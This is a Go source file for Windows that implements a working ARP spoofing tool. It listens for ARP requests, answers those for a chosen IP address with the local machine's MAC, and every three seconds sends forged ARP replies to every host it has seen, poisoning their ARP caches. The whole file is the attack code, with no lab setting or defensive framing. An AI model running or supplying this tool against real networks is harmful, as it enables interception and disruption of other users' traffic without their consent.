//go:build windows

package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"net/netip"
	"os"
	"os/signal"
	"sync"
	"time"

	"arp-spoofing/internal/app"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	mu       sync.Mutex
	macTable = make(map[string]net.HardwareAddr)
)

func captureARP(ctx context.Context, wg *sync.WaitGroup, handle *pcap.Handle, point app.Endpoint) {
	defer wg.Done()

	ps := gopacket.NewPacketSource(handle, handle.LinkType())
	packetChan := ps.Packets()

	for {
		select {
		case <-ctx.Done():
			return
		case packet, ok := <-packetChan:
			if !ok {
				return
			}
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arp := arpLayer.(*layers.ARP)
			if arp.Operation != layers.ARPRequest {
				continue
			}

			srcIP, ok := netip.AddrFromSlice(arp.SourceProtAddress)
			if !ok {
				continue
			}
			srcMAC := net.HardwareAddr(arp.SourceHwAddress)

			mu.Lock()
			macTable[srcIP.String()] = srcMAC
			mu.Unlock()

			dstIP, ok := netip.AddrFromSlice(arp.DstProtAddress)
			if !ok {
				continue
			}

			if dstIP == point.IP {
				fmt.Printf("[>] Caught ARP request for %s from %s / %s\n",
					point.IP, srcIP, srcMAC)

				pkt := app.BuildARPFrame(point.MAC, point.IP, srcMAC, srcIP, layers.ARPReply)
				if err := handle.WritePacketData(pkt); err != nil {
					fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
					continue
				}
				fmt.Printf("[+] Sent ARP reply: %s is at %s\n", point.IP, point.MAC)
			}
		}
	}
}

func run(ifname, spoofedIPStr string) error {
	iface, myIP, err := app.GetInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	spoofedIP, err := app.ParseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	handle, err := app.OpenPcap(ifname, myIP)
	if err != nil {
		return fmt.Errorf("pcap open: %w\nHint: install Npcap from https://npcap.com", err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter("arp"); err != nil {
		return fmt.Errorf("set BPF filter: %w", err)
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP : %s\n", myIP)
	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)

	var wg sync.WaitGroup
	endpoint := app.Endpoint{IP: spoofedIP, MAC: iface.HardwareAddr}
	wg.Add(1)
	go captureARP(ctx, &wg, handle, endpoint)

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			mu.Lock()
			for ip, mac := range macTable {
				targetIP, err := app.ParseIPv4(ip)
				if err != nil {
					continue
				}
				pkt := app.BuildARPFrame(iface.HardwareAddr, spoofedIP, mac, targetIP, layers.ARPReply)
				if err := handle.WritePacketData(pkt); err != nil {
					fmt.Fprintf(os.Stderr, "send spoofed reply to %s: %v\n", ip, err)
				} else {
					fmt.Printf("[+] Spoofed reply: %s is at %s -> %s\n", spoofedIP, iface.HardwareAddr, ip)
				}
			}
			mu.Unlock()
		case <-ctx.Done():
			fmt.Println("\n[*] Exiting")
			handle.Close()
			wg.Wait()
			fmt.Println("[*] Final ARP table:")
			mu.Lock()
			for ip, mac := range macTable {
				fmt.Printf("    %s -> %s\n", ip, mac)
			}
			mu.Unlock()
			return nil
		}
	}
}

func main() {
	var ifname, spoofedIP string
	flag.StringVar(&ifname, "i", "", "network interface")
	flag.StringVar(&spoofedIP, "s", "", "spoofed IPv4 address")
	flag.Parse()

	if ifname == "" || spoofedIP == "" {
		flag.Usage()
		os.Exit(1)
	}

	if err := run(ifname, spoofedIP); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
